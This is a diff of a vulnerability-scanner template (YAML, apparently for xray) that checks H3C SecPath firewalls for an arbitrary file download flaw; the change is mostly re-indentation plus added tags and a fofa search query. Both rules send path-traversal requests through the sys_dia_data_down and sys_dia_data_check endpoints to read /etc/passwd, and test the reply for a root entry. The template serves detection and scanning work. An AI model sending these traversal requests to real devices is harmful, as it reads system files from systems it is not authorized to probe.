@@ -1,22 +1,24 @@
 id: h3c-secpath-firewall-file-read
 
 info:
-    name: H3C SecPath下一代防火墙 sys_dia_data_check 任意文件下载漏洞
-    author: YekkoY
-    severity: high
-    description: |
-        H3C SecPath 下一代防火墙 存在功能点导致任意文件下载漏洞，攻击者通过漏洞可以获取敏感信息
-        title="Web user login"
+  name: H3C SecPath下一代防火墙 sys_dia_data_check 任意文件下载漏洞
+  author: YekkoY
+  severity: high
+  description: |-
+    H3C SecPath 下一代防火墙 存在功能点导致任意文件下载漏洞，攻击者通过漏洞可以获取敏感信息
+    fofa: title="Web user login"
+  tags: h3c,secpath,firewall,file-read
+  created: 2023/07/25
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-    r1:
-        request:
-            method: GET
-            path: /webui/?g=sys_dia_data_check&file_name=../../etc/passwd
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  r0:
+    request:
+      method: GET
+      path: /webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  r1:
+    request:
+      method: GET
+      path: /webui/?g=sys_dia_data_check&file_name=../../etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
 expression: r0() || r1()
